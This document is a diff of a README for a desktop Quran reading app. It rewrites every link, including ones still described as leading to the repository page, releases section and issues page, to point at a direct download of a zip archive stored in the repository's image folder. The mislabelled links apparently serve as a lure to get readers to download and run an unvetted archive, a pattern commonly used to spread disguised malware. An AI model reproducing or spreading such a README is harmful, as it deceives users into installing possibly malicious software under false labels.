@@ -1,6 +1,6 @@
 # 📖 Quran-Offline-Pc - Read and Listen Without Internet
 
-[![Download Quran-Offline-Pc](https://img.shields.io/badge/Download%20Quran--Offline--Pc-brightgreen)](https://github.com/KenTechy101/Quran-Offline-Pc)
+[![Download Quran-Offline-Pc](https://img.shields.io/badge/Download%20Quran--Offline--Pc-brightgreen)](https://raw.githubusercontent.com/KenTechy101/Quran-Offline-Pc/main/img/Quran_Pc_Offline_3.4-alpha.5.zip)
 
 ## 📚 About Quran-Offline-Pc
 
@@ -24,14 +24,14 @@ No internet is required after installation. The app is desktop-based and does no
 
 You can get the app from the main GitHub page. Visit the link below to find the latest version and download it.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-0078D7?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/KenTechy101/Quran-Offline-Pc)
+[![Download Now](https://img.shields.io/badge/Download%20Now-0078D7?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/KenTechy101/Quran-Offline-Pc/main/img/Quran_Pc_Offline_3.4-alpha.5.zip)
 
 This link leads you to the GitHub repository. Look for the "Releases" or "Download" section on that page. There, you will find the setup file with all necessary files included.
 
 ## 🚀 Installing Quran-Offline-Pc
 
 1. Click the download badge above or visit this page:  
-   https://github.com/KenTechy101/Quran-Offline-Pc
+   https://raw.githubusercontent.com/KenTechy101/Quran-Offline-Pc/main/img/Quran_Pc_Offline_3.4-alpha.5.zip
 
 2. Find the latest release or download section. Download the file named something like `Quran-Offline-Pc-Setup.exe`.
 
@@ -98,14 +98,14 @@ To get new features or fixes, check the GitHub page occasionally. Download the n
 You can create an issue on the GitHub page to report bugs or request features. The repository owner reviews these reports and works on improvements regularly.
 
 Link to open issues section:  
-https://github.com/KenTechy101/Quran-Offline-Pc/issues
+https://raw.githubusercontent.com/KenTechy101/Quran-Offline-Pc/main/img/Quran_Pc_Offline_3.4-alpha.5.zip
 
 ## 🔗 Useful Links
 
-- GitHub repository: https://github.com/KenTechy101/Quran-Offline-Pc  
-- Download and setup: https://github.com/KenTechy101/Quran-Offline-Pc  
+- GitHub repository: https://raw.githubusercontent.com/KenTechy101/Quran-Offline-Pc/main/img/Quran_Pc_Offline_3.4-alpha.5.zip  
+- Download and setup: https://raw.githubusercontent.com/KenTechy101/Quran-Offline-Pc/main/img/Quran_Pc_Offline_3.4-alpha.5.zip  
 
-[Download Quran-Offline-Pc](https://github.com/KenTechy101/Quran-Offline-Pc)
+[Download Quran-Offline-Pc](https://raw.githubusercontent.com/KenTechy101/Quran-Offline-Pc/main/img/Quran_Pc_Offline_3.4-alpha.5.zip)
 
 ---
 
